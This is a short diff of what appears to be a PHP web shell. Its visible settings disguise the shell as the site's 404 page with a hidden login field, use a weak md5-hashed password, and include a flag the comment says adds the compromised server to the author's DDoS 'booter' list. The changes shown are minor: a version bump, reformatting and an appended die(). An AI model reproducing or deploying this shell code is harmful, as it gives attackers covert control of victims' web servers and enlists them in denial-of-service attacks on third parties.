@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.15;
+$version            = 3.151;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -5059,8 +5059,7 @@ function closetags($html) {
     }
     return $html;
 }
-function pr($s)
-{
+function pr($s){
     echo "<pre>" . print_r($s) . '</pre>';
 }
-;
+die();
